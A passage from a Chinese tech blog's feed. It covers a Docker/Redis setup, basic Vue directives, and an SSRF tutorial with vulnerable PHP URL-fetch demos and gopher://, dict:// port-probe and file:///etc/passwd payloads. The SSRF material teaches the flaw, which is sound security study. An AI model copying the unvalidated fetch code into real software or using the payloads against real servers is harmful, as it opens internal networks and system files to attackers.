class="line">root@fxxy-virtual-machine:/# curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>检测是否安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@fxxy-virtual-machine:/# sudo apt-key fingerprint 0EBFCD88</span><br><span class="line">pub   rsa4096 2017-02-22 [SCEA]</span><br><span class="line">      9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid           [ 未知 ] Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   rsa4096 2017-02-22 [S]</span><br></pre></td></tr></table></figure><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install docker-ce</span><br></pre></td></tr></table></figure><h3 id="检测安装成功"><a href="#检测安装成功" class="headerlink" title="检测安装成功"></a>检测安装成功</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p>安装成功会输出以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@fxxy-virtual-machine:/# sudo docker run hello-world</span><br><span class="line">Unable to find image &#x27;hello-world:latest&#x27; locally</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">0e03bdcc26d7: Pull complete </span><br><span class="line">Digest: sha256:d58e752213a51785838f9eed2b7a498ffa1cb3aa7f946dda11af39286c3db9a9</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure><h2 id="安装redis"><a href="#安装redis" class="headerlink" title="安装redis"></a>安装redis</h2><h3 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull redis:latest</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621133248981.png" alt="image-20200621133248981"></p><h3 id="查看安装"><a href="#查看安装" class="headerlink" title="查看安装"></a>查看安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/5O2T%QIUJGOJS%7JK%5DZV7%5B0.png" alt="img"></p><h3 id="映射服务"><a href="#映射服务" class="headerlink" title="映射服务"></a>映射服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name redis-test -p 6379:6379 redis</span><br></pre></td></tr></table></figure><ul><li><strong>-p 6379:6379</strong>：将redis的6379端口映射到宿主机的6379端口，可以直接通过访问宿主机的IP来访问redis服务</li></ul><h3 id="查看运行"><a href="#查看运行" class="headerlink" title="查看运行"></a>查看运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>可以看到运行的docker服务中出现redis</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621133819912.png" alt="image-20200621133819912"></p><h3 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it redis-test /bin/bash</span><br></pre></td></tr></table></figure><p>这段命令的作用：</p><ul><li>exec：在运行的容器中执行命令</li><li>-it：进入容器的终端并获得输入</li></ul><p>那合起来就是，使用redies-test这个容器，并分配一个伪终端给到我们</p><p>用redis-cli登录redis服务</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621134522276.png" alt="image-20200621134522276"></p><p>退出当前容器快捷键为ctrl-D。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;为什么要学docker？因为搭环境太累了！！&lt;/p&gt;</summary>
    
    
    
    
    <category term="docker" scheme="http://example.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>vue 基础指令学习</title>
    <link href="http://example.com/2019/10/27/vue%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/"/>
    <id>http://example.com/2019/10/27/vue%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/</id>
    <published>2019-10-26T16:00:00.000Z</published>
    <updated>2021-10-25T05:14:07.389Z</updated>
    
    <content type="html"><![CDATA[<p>…..</p><span id="more"></span><h3 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h3><p>html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">            &#123;&#123; message &#125;&#125;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new Vue(</span><br><span class="line">    &#123;</span><br><span class="line">        el: &#x27;#app&#x27;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            message:&#x27;hello vue&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><blockquote><p>对绑定的属性进行html渲染</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div v-html=&quot;message&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#x27;#app&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: &#x27;&lt;h1&gt;fxxy&lt;/h1&gt;&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="v-html-amp-v-text"><a href="#v-html-amp-v-text" class="headerlink" title="v-html &amp; v-text"></a>v-html &amp; v-text</h4><blockquote><p>v-html会对绑定的属性进行渲染，如果内容中有html标签，则在页面中不会出现，而v-text则不会进行渲染，如果内容中有html标签，则会以源码显示</p></blockquote><h3 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h3><blockquote><p>为html中的元素绑定事件，监听 DOM 事件，触发methods,缩写为<code>@</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app5&quot;&gt;</span><br><span class="line">            &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">            &lt;button v-on:click=&quot;reverseMessage&quot;&gt; 逆转消息 &lt;/button&gt;</span><br><span class="line">        &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">new Vue(</span><br><span class="line">    &#123;</span><br><span class="line">        el:&#x27;#app5&#x27;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            message:&#x27;张峻山是猪！&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            reverseMessage:function()&#123;</span><br><span class="line">                this.message = this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><blockquote><p>为html中的元素绑定data属性，v-bind 指令被用来响应地更新 HTML 属性，缩写为 <code>:</code></p></blockquote><p>html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app2&quot;&gt;</span><br><span class="line">                &lt;span v-bind:title=&quot;date&quot;&gt;</span><br><span class="line">                  鼠标悬停几秒钟查看此处动态绑定的提示信息！</span><br><span class="line">                &lt;/span&gt;</span><br><span class="line">                &lt;a v-bind:href=&quot;url&quot;&gt;&lt;/a&gt;</span><br><span class="line">                &lt;a :target=&quot;url&quot;&gt;&lt;/a&gt;</span><br><span class="line">                </span><br><span class="line">        &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">new Vue (</span><br><span class="line">    &#123;</span><br><span class="line">        el:&#x27;#app2&#x27;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            date:&#x27;页面加载与&#x27; + new Date().toLocaleString(),</span><br><span class="line">            url:&#x27;www.google.com&#x27;,</span><br><span class="line">            target:&#x27;_blank&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="v-if-、v-else-、v-else-if"><a href="#v-if-、v-else-、v-else-if" class="headerlink" title="v-if 、v-else 、v-else-if"></a>v-if 、v-else 、v-else-if</h3><p>html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app3&quot;&gt;</span><br><span class="line">            &lt;div v-if=&quot;type === A&quot;&gt; </span><br><span class="line">            A </span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt;</span><br><span class="line">            B </span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt;</span><br><span class="line">     C</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div v-else&gt;</span><br><span class="line">      Not A/B/C</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new Vue(</span><br><span class="line">    &#123;</span><br><span class="line">        el:&#x27;#app3&#x27;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            type:&#x27;A&#x27;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#x27;#app&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    ok: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="v-if-和v-show的区别"><a href="#v-if-和v-show的区别" class="headerlink" title="v-if 和v-show的区别"></a>v-if 和v-show的区别</h4><blockquote><p>v-if 是动态添加，当值为 false 时，是完全移除该元素，即 dom 树中不存在该元素。</p></blockquote><blockquote><p>v-show 仅是隐藏 / 显示，值为 false 时，该元素依旧存在于 dom 树中。若其原有样式设置了 display: none 则会导致其无法正常显示。</p></blockquote><p>如果需要频繁切换 v-show 较好，如果在运行时条件不大可能改变 v-if 较好。</p><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><p>html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app4&quot;&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li v-for = &#x27;todo in todos&#x27;&gt;</span><br><span class="line">                    &#123;&#123;todo.text&#125;&#125;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">new Vue(</span><br><span class="line">    &#123;</span><br><span class="line">        el:&#x27;#app4&#x27;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            todos:[</span><br><span class="line">                &#123;text:&quot;zjs is a pig&quot;&#125;,</span><br><span class="line">                &#123;text:&quot;zjs is a big pig&quot;&#125;,</span><br><span class="line"></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><blockquote><p>实现双向数据绑定</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app6&quot;&gt;</span><br><span class="line">            &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">            &lt;input v-model=&quot;message&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app6&quot;&gt;</span><br><span class="line">            &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">            &lt;input v-model=&quot;message&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> ref=<span class="string">&quot;name&quot;</span> v-on:keyup=<span class="string">&quot;logName&quot;</span>&gt;</span><br><span class="line"><span class="built_in">this</span>.name=<span class="built_in">this</span>.$refs.name.value</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;…..&lt;/p&gt;</summary>
    
    
    
    
    <category term="vue" scheme="http://example.com/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>SSRF-服务端请求伪造</title>
    <link href="http://example.com/2019/09/26/SSRF/"/>
    <id>http://example.com/2019/09/26/SSRF/</id>
    <published>2019-09-25T16:00:00.000Z</published>
    <updated>2021-10-25T05:13:25.919Z</updated>
    
    <content type="html"><![CDATA[<ul><li>SSRF：服务端请求伪造漏洞</li><li>原理：由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用在外网探测或攻击内网服务。漏洞大多数发生在连接外网与内网的跳板机中</li><li>成因：服务器未对发起请求的URL进行有效检测和过滤。</li><li>哪些地方容易出现SSRF：<ul><li>网站的分享功能</li><li>在线翻译，通过URL地址进行翻译</li><li>PC到手机的转码服务（通过url把原网址内容转成适合手机阅读的情况）</li><li>图片文章的加载、下载、收藏</li><li>……..</li></ul></li></ul><span id="more"></span><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>以下代码demo，都未对会发起请求的URL参数进行过滤检测而服务器直接进行请求</p><ul><li>get_file_content()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line">    <span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line">    <span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>fsockopen()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>curl_exec()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">    curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher协议，最早出现在tcp ip协议之前，可以用它来向指定的地址和端口发送GET、POST请求</p><ul><li>格式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/_ + TCP/IP数据</span><br></pre></td></tr></table></figure><ul><li>默认端口：70。如果在使用gopher协议时未指定相关的端口，则默认发送到主机地址的70端口</li><li>实践</li></ul><p>在test.php中写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用burp抓取一个流量包后，将内容进行url编码</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/2JH4B1VVK%7D4YLAZMLLV7APW.png" alt="img"></p><p>然后打开终端，输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gooher://127.0.0.1:80/_数据包编码后的内容</span><br></pre></td></tr></table></figure><p>然后页面进行相应输出，如果要传POST包，则将包进行相应编码则可</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/1234.png" alt="1234"></p><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><ul><li><p>dict是基于查询响应的TCP协议。</p></li><li><p>默认端口：2628</p></li><li><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://&lt;host&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure></li><li><p>实践</p></li></ul><p>端口探测：对80、22、3306进行探测</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200620181710993.png" alt="image-20200620181710993"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><ul><li>计算机本地的file协议，可以查看相应的文件，file的路径需是绝对路径</li><li>实践</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl file:///etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200620182007533.png" alt="image-20200620182007533"></p><h2 id="SSRF本地实践"><a href="#SSRF本地实践" class="headerlink" title="SSRF本地实践"></a>SSRF本地实践</h2><p>在ssrf.php中，写入一段广为流传的可以造成SSRF漏洞的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$curl</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 初始化一个新cURL资源</span></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置URL和相应的选项,将对应的值赋给$ch句柄</span></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//执行</span></span><br><span class="line">    curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="comment">//关闭资源</span></span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span 